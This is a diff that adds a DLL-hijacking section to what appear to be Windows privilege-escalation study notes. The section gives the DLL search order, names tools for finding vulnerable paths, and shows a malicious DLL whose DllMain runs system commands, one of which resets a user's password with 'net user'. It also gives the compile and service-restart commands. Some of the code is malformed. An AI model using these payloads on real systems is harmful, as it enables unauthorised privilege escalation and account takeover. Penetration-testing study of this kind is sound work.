@@ -95,3 +95,55 @@ Any port listed as “LISTENING” that was not discovered with the external por
 $ schtasks /query /fo LIST /v
 ```
 
+## DLL hijacking
+
+Windows follow one og these concepts:
+- SafeDllSearchMode enabled:
+  - The directory from which the application loaded.
+  - The system directory. Use the GetSystemDirectory function to get the path of this directory.
+  - The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
+  - The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.
+  - The current directory.
+  - The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.
+
+- SafeDllSearchMode is disabled
+  - The directory from which the application loaded.
+  - The current directory.
+  - The system directory. Use the GetSystemDirectory function to get the path of this directory.
+  - The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
+  - The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.
+  - The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key.     The App Paths key is not used when computing the DLL search path.
+
+Finding Vulnerarbilities with `ProcMon` or any script like winPEAS
+ProcMon needs admin privileges
+
+Creating the malicious DLL file with Payload:
+
+```
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+
+    Payload for changing PW:
+    "cmd.exe /k net user jack Password11"
+}
+```
+use minqw compiler to generate dll file:
+```
+$ apt install gcc-mingw-w64-x86-64
+$ x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+start and restart the llsvc
+$ sc stop dllsvc & sc start dllsvc
+```
+
+## Unquoted Service Path
+
+
+
+
